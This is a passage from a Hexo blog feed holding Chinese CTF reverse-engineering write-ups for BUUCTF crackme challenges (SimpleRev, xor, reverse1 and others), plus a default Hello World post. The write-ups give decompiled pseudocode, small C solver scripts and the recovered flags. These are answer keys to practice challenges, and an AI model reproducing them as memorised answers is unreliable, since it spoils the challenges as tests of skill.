class="line">        &#123;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">                if ( v6 &gt; a1[result] )</span><br><span class="line">                &#123;</span><br><span class="line">                    if ( i &gt;&#x3D; result )</span><br><span class="line">                        break;</span><br><span class="line">                    ++i;</span><br><span class="line">                    a1[v5] &#x3D; a1[result];</span><br><span class="line">                    if ( i &gt;&#x3D; result )</span><br><span class="line">                        break;</span><br><span class="line">                    while ( a1[i] &lt;&#x3D; v6 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        if ( ++i &gt;&#x3D; result )</span><br><span class="line">                        goto LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if ( i &gt;&#x3D; result )</span><br><span class="line">                        break;</span><br><span class="line">                    v5 &#x3D; i;</span><br><span class="line">                    a1[result] &#x3D; a1[i];</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( i &lt; result );</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        a1[result] &#x3D; v6;</span><br><span class="line">        sub_4010F0(a1, a2, i - 1);</span><br><span class="line">        result &#x3D; a3;</span><br><span class="line">        ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/3.png"></p><p>接着查看函数sub_401000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">BOOL __userpurge DialogFunc@&lt;eax&gt;(int a1@&lt;edi&gt;, int a2@&lt;esi&gt;, HWND hDlg, UINT a4, WPARAM a5, LPARAM a6)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v6; &#x2F;&#x2F; esi</span><br><span class="line">  const char *v7; &#x2F;&#x2F; edi</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+4h] [ebp-20030h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+8h] [ebp-2002Ch]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+Ch] [ebp-20028h]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+10h] [ebp-20024h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+14h] [ebp-20020h]</span><br><span class="line">  int v14; &#x2F;&#x2F; [esp+18h] [ebp-2001Ch]</span><br><span class="line">  int v15; &#x2F;&#x2F; [esp+1Ch] [ebp-20018h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+20h] [ebp-20014h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+24h] [ebp-20010h]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+28h] [ebp-2000Ch]</span><br><span class="line">  int v19; &#x2F;&#x2F; [esp+2Ch] [ebp-20008h]</span><br><span class="line">  CHAR String; &#x2F;&#x2F; [esp+30h] [ebp-20004h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+31h] [ebp-20003h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+32h] [ebp-20002h]</span><br><span class="line">  char v23; &#x2F;&#x2F; [esp+33h] [ebp-20001h]</span><br><span class="line">  char v24; &#x2F;&#x2F; [esp+34h] [ebp-20000h]</span><br><span class="line">  char v25; &#x2F;&#x2F; [esp+10030h] [ebp-10004h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+10031h] [ebp-10003h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [esp+10032h] [ebp-10002h]</span><br><span class="line">  int v28; &#x2F;&#x2F; [esp+20028h] [ebp-Ch]</span><br><span class="line">  int v29; &#x2F;&#x2F; [esp+2002Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  __alloca_probe();</span><br><span class="line">  if ( a4 &#x3D;&#x3D; 272 )</span><br><span class="line">    return 1;</span><br><span class="line">  v29 &#x3D; a2;</span><br><span class="line">  v28 &#x3D; a1;</span><br><span class="line">  if ( a4 !&#x3D; 273 )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( a5 &#x3D;&#x3D; 1001 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;String, 0, 0xFFFFu);</span><br><span class="line">    GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF);</span><br><span class="line">    if ( strlen(&amp;String) &#x3D;&#x3D; 8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 &#x3D; 90;</span><br><span class="line">      v10 &#x3D; 74;</span><br><span class="line">      v11 &#x3D; 83;</span><br><span class="line">      v12 &#x3D; 69;</span><br><span class="line">      v13 &#x3D; 67;</span><br><span class="line">      v14 &#x3D; 97;</span><br><span class="line">      v15 &#x3D; 78;</span><br><span class="line">      v16 &#x3D; 72;</span><br><span class="line">      v17 &#x3D; 51;</span><br><span class="line">      v18 &#x3D; 110;</span><br><span class="line">      v19 &#x3D; 103;</span><br><span class="line">      sub_4010F0(&amp;v9, 0, 10);</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v6 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v26 &#x3D; v23;</span><br><span class="line">      v25 &#x3D; v22;</span><br><span class="line">      v27 &#x3D; v24;</span><br><span class="line">      v7 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      if ( String &#x3D;&#x3D; v9 + 34</span><br><span class="line">        &amp;&amp; v21 &#x3D;&#x3D; v13</span><br><span class="line">        &amp;&amp; 4 * v22 - 141 &#x3D;&#x3D; 3 * v11</span><br><span class="line">        &amp;&amp; v23 &#x2F; 4 &#x3D;&#x3D; 2 * (v16 &#x2F; 9)</span><br><span class="line">        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)</span><br><span class="line">        &amp;&amp; !strcmp(v7, &quot;V1Ax&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a5 !&#x3D; 1 &amp;&amp; a5 !&#x3D; 2 )</span><br><span class="line">    return 0;</span><br><span class="line">  EndDialog(hDlg, a5);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/4.png"></p><p>我们可以猜测这里应该是base64加密。</p><h2 id="3-得出flag"><a href="#3-得出flag" class="headerlink" title="3.得出flag"></a>3.得出flag</h2><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/8.png"></p><p>string是一个8位的数组，再结合最开始的定义：</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/5.png"></p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/6.png"></p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/7.png"></p><p>而且v22-v24压入了同一处，v25-v27压入了同一处。<br>之后将”ak1w”和”V1Ax”进行base64解密。前三个为ak1w的，后三个为V1Ax的。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/9.png"></p><p>将这些字符拼接再一起就是flag。<br>由于v7是经v22、v23、v24得来的，所WP1先输入，jMp后输入。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/10.png"></p><p>flag{UJWP1jMp}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/01/19/hello-world/"/>
      <url>2021/01/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假第一周</title>
      <link href="2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
      <url>2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#SimpleRev">题目链接</a><br>查看文件信息</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_1.png"></p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 Decry()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; &#x2F;&#x2F; [rsp+Fh] [rbp-51h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [rsp+10h] [rbp-50h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [rsp+14h] [rbp-4Ch]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+18h] [rbp-48h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+1Ch] [rbp-44h]</span><br><span class="line">  char src[8]; &#x2F;&#x2F; [rsp+20h] [rbp-40h]</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-38h]</span><br><span class="line">  int v8; &#x2F;&#x2F; [rsp+30h] [rbp-30h]</span><br><span class="line">  __int64 v9; &#x2F;&#x2F; [rsp+40h] [rbp-20h]</span><br><span class="line">  __int64 v10; &#x2F;&#x2F; [rsp+48h] [rbp-18h]</span><br><span class="line">  int v11; &#x2F;&#x2F; [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v12; &#x2F;&#x2F; [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  *(_QWORD *)src &#x3D; &#39;SLCDN&#39;;</span><br><span class="line">  v7 &#x3D; 0LL;</span><br><span class="line">  v8 &#x3D; 0;</span><br><span class="line">  v9 &#x3D; &#39;wodah&#39;;</span><br><span class="line">  v10 &#x3D; 0LL;</span><br><span class="line">  v11 &#x3D; 0;</span><br><span class="line">  text &#x3D; (char *)join(key3, &amp;v9);               &#x2F;&#x2F; text&#x3D;killshadow</span><br><span class="line">  strcpy(key, key1);                            &#x2F;&#x2F; key&#x3D;ADSFKDNCLS</span><br><span class="line">  strcat(key, src);</span><br><span class="line">  v2 &#x3D; 0;</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 &#x3D; strlen(key);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;&#x3D; 90 )&#x2F;&#x2F; 大写变小写</span><br><span class="line">      key[i] &#x3D; key[v3 % v5] + 32;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Please input your flag:&quot;, src);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; getchar();</span><br><span class="line">    if ( v1 &#x3D;&#x3D; 10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v1 &#x3D;&#x3D; 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v1 &lt;&#x3D; 96 || v1 &gt; 122 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v1 &gt; 64 &amp;&amp; v1 &lt;&#x3D; 90 )</span><br><span class="line">          str2[v2] &#x3D; (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] &#x3D; (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !(v3 % v5) )</span><br><span class="line">        putchar(32);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !strcmp(text, str2) )</span><br><span class="line">    puts(&quot;Congratulation!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Try again!\n&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个伪代码就是将key由大写变为小写，即key = “ADSFKNDCLS”。<br>然后输入v1，我们对v1进行运算得到str2，将str2与text比较相同就正确。这里v1就是flag，我们知道str2，所以对v1进行逆运算，以下为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char text[]&#x3D;&quot;killshadow&quot;;</span><br><span class="line">    char key[]&#x3D;&quot;adsfkndcls&quot;;</span><br><span class="line">    int v5 &#x3D; strlen(key),i,j,v3&#x3D;0;</span><br><span class="line">    char flag[v5];</span><br><span class="line">    for ( i &#x3D; 0; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;&#x3D; 90 )</span><br><span class="line">            key[i] &#x3D; key[v3 % v5] + 32;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;v5;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;5;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] &#x3D; text[i] - 97 + 26*j + 39 -97 + key[i];</span><br><span class="line">            if(flag[i] &gt;&#x3D; 65 &amp;&amp; flag[i] &lt;&#x3D; 90)</span><br><span class="line">                printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_3.png"></p><p>最后在外面套上falg。</p><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p><a href="https://buuoj.cn/challenges#xor">题目链接</a><br>查看文件信息</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_1.png"></p><p>ida查看main函数伪代码</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_2.png"></p><p>意思就是输入33个字符，后一位与前一位进行异或运算，异或后的结果与global比较，相同则成功。我们对global进行逆运算，得出的即是flag。两次异或会还原，所以异或的逆运算还是异或。<br>下面为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char v6[33];</span><br><span class="line">    char global[33]&#x3D;&#123;&#39;f&#39;,0xA,&#39;k&#39;,0xC,&#39;w&#39;,&#39;&amp;&#39;,&#39;O&#39;,&#39;.&#39;,&#39;@&#39;,0x11,&#39;x&#39;,0x0D,&#39;Z&#39;,&#39;;&#39;,&#39;U&#39;,0x11,&#39;p&#39;,0x19,&#39;F&#39;,0x1F,&#39;v&#39;,&#39;&quot;&#39;,&#39;M&#39;,&#39;#&#39;,&#39;D&#39;,0x0E,&#39;g&#39;,6,&#39;h&#39;,0x0F,&#39;G&#39;,&#39;2&#39;,&#39;O&#39;&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for ( i &#x3D; 1; i &lt; 33; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v6[i] &#x3D;global[i] ^ global[i - 1];</span><br><span class="line">        printf(&quot;%c&quot;,v6[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_4.png"></p><p>第一位f是不运算的，抄上就行了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二周学习与做题记录</title>
      <link href="2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><a id="more"></a><ol><li>学习了while、for、do while循环</li><li>学习了&gt;、&gt;=、!=、==、+=等运算符</li></ol><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write_up"></a>Write_up</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p><a href="https://buuoj.cn/challenges#easyre">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/easyre_1.PNG"></p><p>IDA打开搜索字符串即找到flag</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/easyre_2.PNG"></p><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p><a href="https://buuoj.cn/challenges#reverse1">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_1.PNG"></p><p>IDA打开查看字符串</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_2.PNG"></p><p>由 this is the right flag 转到主要函数</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_4.PNG"></p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_3.PNG"></p><p>flag为{hell0_w0rld}</p><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p><a href="https://buuoj.cn/challenges#reverse3">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_1.PNG"></p><p>ida32打开查看main函数</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_2.PNG"></p><p>sub_4110BE经过跳转为下方函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl sub_411AB0(char *a1, unsigned int a2, int *a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; &#x2F;&#x2F; STE0_4</span><br><span class="line">  int v5; &#x2F;&#x2F; STE0_4</span><br><span class="line">  int v6; &#x2F;&#x2F; STE0_4</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+D4h] [ebp-38h]</span><br><span class="line">  signed int i; &#x2F;&#x2F; [esp+E0h] [ebp-2Ch]</span><br><span class="line">  unsigned int v9; &#x2F;&#x2F; [esp+ECh] [ebp-20h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+ECh] [ebp-20h]</span><br><span class="line">  signed int v11; &#x2F;&#x2F; [esp+ECh] [ebp-20h]</span><br><span class="line">  void *Dst; &#x2F;&#x2F; [esp+F8h] [ebp-14h]</span><br><span class="line">  char *v13; &#x2F;&#x2F; [esp+104h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !a1 || !a2 )</span><br><span class="line">    return 0;</span><br><span class="line">  v9 &#x3D; a2 &#x2F; 3;</span><br><span class="line">  if ( (signed int)(a2 &#x2F; 3) % 3 )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 &#x3D; 4 * v9;</span><br><span class="line">  *a3 &#x3D; v10;</span><br><span class="line">  Dst &#x3D; malloc(v10 + 1);</span><br><span class="line">  if ( !Dst )</span><br><span class="line">    return 0;</span><br><span class="line">  j_memset(Dst, 0, v10 + 1);</span><br><span class="line">  v13 &#x3D; a1;</span><br><span class="line">  v11 &#x3D; a2;</span><br><span class="line">  v7 &#x3D; 0;</span><br><span 